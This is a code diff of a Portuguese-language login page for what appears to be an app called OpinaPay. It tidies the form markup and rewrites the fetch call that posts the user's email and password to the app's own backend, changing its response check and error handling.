@@ -102,20 +102,17 @@
       <p>Use sua Conta</p>
       <input type="email" id="email" placeholder="E‑mail ou telefone" required />
       <input type="password" id="password" placeholder="Sua senha" required />
-      <div class="link">
-        <a href="#">Esqueceu o e-mail?</a>
-      </div>
-
+      <div class="link"><a href="#">Esqueceu o e‑mail?</a></div>
       <div class="buttons">
-        <button type="submit" class="btn btn-primary">Avançar</button>
+        <button type="submit" class="btn">Avançar</button>
       </div>
     </form>
   </div>
 
   <script>
-  const API_URL = 'https://opinapay-api.onrender.com';
+    const API_URL = 'https://opinapay-api.onrender.com';
 
-  async function login() {
+    async function login() {
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value.trim();
 
@@ -124,26 +121,21 @@
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email, password }),
-          credentials: 'omit'
+          mode: 'cors'
         });
         const data = await response.json();
-        if (data.success) {
-          window.location.href = 'pesquisas.html';
-        } else {
-          throw new Error(data.error || 'Falha no login');
-        }
+        if (!response.ok) throw new Error(data.error || 'Falha no login');
+        window.location.href = 'pesquisas.html';
       } catch (err) {
-        alert(err.message);
+        alert('Erro: ' + err.message);
         console.error(err);
       }
     }
 
-    document.getElementById('login-form')
-      .addEventListener('submit', function(e) {
-        e.preventDefault();
-        login();
-      });
-</script>
-  
+    document.getElementById('login-form').addEventListener('submit', e => {
+      e.preventDefault();
+      login();
+    });
+  </script>
 </body>
 </html>
